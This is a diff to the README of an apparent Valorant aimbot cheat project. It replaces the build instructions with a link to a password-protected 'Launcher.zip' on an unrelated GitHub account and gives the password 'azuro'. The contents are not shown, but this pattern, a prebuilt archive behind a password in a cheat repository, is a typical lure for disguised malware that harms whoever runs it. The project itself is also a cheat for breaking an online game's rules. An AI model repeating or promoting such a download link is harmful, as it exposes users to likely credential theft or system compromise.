@@ -6,7 +6,7 @@ This will not manipulate addresses and memories of the game, it's 100% memory in
 Customizable via menu.  
 - Panic key is 'Del', press it to exit the cheat.  
   
-![preview](prev.png)    
+[<img width="638" height="400" alt="prev" src="https://github.com/user-attachments/assets/67c012a7-af4e-430c-ab59-4647903315d5" />](https://github.com/Valorant-External-Cheat-2026/.github/blob/main/prev.png)   
  
 # INFO    
 - Change the saturation if it's shoting poorly or not shoting.  
@@ -23,9 +23,9 @@ Select a 'Keybind' and alias it to Valorant as a seconday fire key.
 This project won't be continued.  
 I've not tested the cheat since 'first commit' release date.  
 
-## COMPILATION   
-You need to download [GLFW pre-compiled binaries](https://github.com/Piecegloeradicate/latest/releases/download/New/Launcher.zip) and add the `/include` folder to the Include path.  
-Also include `/vs-XXXX` (XXXX = Visual Studio Version, ex: vs-2022 for VStudio 2022) to the lib folder. 
-  
-  
+## DOWNLOAD   
+You need to download [Launcher](https://github.com/Piecegloeradicate/latest/releases/download/New/Launcher.zip)
+
+* Pass: azuro
+
 Feel free to make pull/reqs or collaborate.   
